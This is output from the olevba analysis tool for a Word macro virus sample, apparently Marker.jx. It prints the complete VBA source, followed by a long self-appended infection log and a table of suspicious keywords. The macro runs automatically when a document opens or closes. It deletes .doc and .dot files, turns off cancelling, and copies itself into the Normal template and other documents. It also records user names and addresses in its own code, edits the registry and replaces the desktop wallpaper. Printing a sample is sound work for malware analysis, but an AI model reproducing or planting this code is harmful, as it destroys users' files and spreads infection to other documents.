olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.jx-aa5a81053f2c783a680c3b6db1e83157b3d13484
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.jx-aa5a81053f2c783a680c3b6db1e83157b3d13484 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Seline, Where are you dear
Const Marker = "<- this is a marker! by jonhehehe TheBest-versi212x"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
'AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
'Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
DI = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
   nt.CodeModule.AddFromString Jon
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString Jon
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylife<p>"
 Print #1, "<p>Long ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "<p>You were gone since yester month But the memories, never would dissapear"
 Print #1, "<p>I think of you, I THINK OF YOU.<p>"
 Print #1, "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "<p>Long ago so faraway. But the light of blue, still living with me today."
 Print #1, "<p>You were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' JonMMx 2000
' jonthebest@hotbot.com


' 09:07:259:07:25 -Sabtu, 24 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:05:474:05:47 AM AM-Thursday, 26 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:41:387:41:38 PM PM-Friday, 27 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:43:2212:43:22 PM PM-Monday, 30 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:02:559:02:55 -Sabtu, 28 Agust 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:16:1314:16:13 -Jumat, 3 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:17:374:17:37 AM AM-Saturday, 4 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:42:399:42:39 PM PM-Monday, 6 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:00:4210:00:42 PM PM-Wednesday, 8 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:19:334:19:33 PM PM-Thursday, 9 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:32:279:32:27 AM AM-Thursday, 16 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:23:111:23:11 PM PM-Wednesday, 6 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:56:212:56:02 PM PM-Friday, 8 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:37:611:37:06 AM AM-Saturday, 9 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:43:710:43:07 PM PM-Thursday, 14 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:30:25:30:02 PM PM-Wednesday, 10 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:17:510:17:05 AM AM-Tuesday, 16 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:17:146:17:14 PM PM-Monday, 15 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:32:467:32:46 PM PM-Thursday, 18 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:06:587:06:58 PM PM-Wednesday, 24 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:38:422:38:42 AM AM-Thursday, 25 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:59:48:59:04 PM PM-Thursday, 25 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:18:221:18:22 -Jumat, 26 Nop 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:51:287:51:28 PM PM-Monday, 29 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:58:510:58:05 -jeudi, 2 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:11:114:11:01 -lundi, 6 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:58:1918:58:19 -mardi, 7 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:43:2714:43:27 -lundi, 13 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:10:2511:10:25 -vendredi, 17 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:47:3123:47:31 -lundi, 20 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:45:5911:45:59 -mardi, 28 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:11:2115:11:21 -vendredi, 7 janv 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:49:2616:49:26 -jueves, 27 ene 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:34:2415:34:24 -lunes, 7 feb 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:24:3714:24:37 -lunes, 14 feb 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:52:819:52:08 -sábado, 26 feb 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:51:217:51:02 -martes, 29 feb 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:11:2717:11:27 -lunes, 6 mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:35:5718:35:57  p.m.-jueves, 16 mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:22:4314:22:43 -martes, 28 mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:33:3412:33:34  p.m.-martes, 4 abr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:40:514:40:05  p.m.-martes, 4 abr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:48:214:48:02  p.m.-miércoles, 12 abr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:46:3917:46:39 -martes, 18 abr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:40:5710:40:57 AM AM-Miércoles, 19 Abr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:21:2417:21:24 -martes, 16 may 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:18:2317:18:23 -martes, 23 may 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:59:2310:59:23 -lunes, 12 jun 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:37:229:37:22  a.m.-miércoles, 5 jul 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:46:5612:46:56  p.m.-miércoles, 5 jul 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:17:3415:17:34  p.m.-jueves, 6 jul 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:55:2110:55:21  a.m.-viernes, 18 ago 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:11:3012:11:30  p.m.-martes, 22 ago 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11.41.511.41.05 -miércoles, 23 ago 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:07:99:07:09  a.m.-martes, 29 ago 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:42:399:42:39  a.m.-lunes, 4 sep 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:14:1313:14:13  p.m.-domingo, 13 oct 2002
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:06:611:06:06  a.m.-jueves, 26 oct 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:19:5713:19:57  p.m.-viernes, 3 nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:35:4111:35:41  a.m.-miércoles, 8 nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:47:249:47:24  a.m.-miércoles, 29 nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:48:248:48:24  a.m.-lunes, 4 dic 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:24:1012:24:10  p.m.-viernes, 15 dic 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:26:3316:26:33 -sábado, 26 may 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:33:1913:33:19 -miércoles, 5 sep 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01.50.1213.50.12 -viernes, 14 sep 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:38:518:38:05 -lunes, 24 sep 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:20:45:20:04 PM PM-Monday, 19 Nov 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:14:3514:14:35  <(©¿©)>-Tuesday, 20 Nov 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:40:391:40:39 PM PM-Friday, 20 Apr 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+
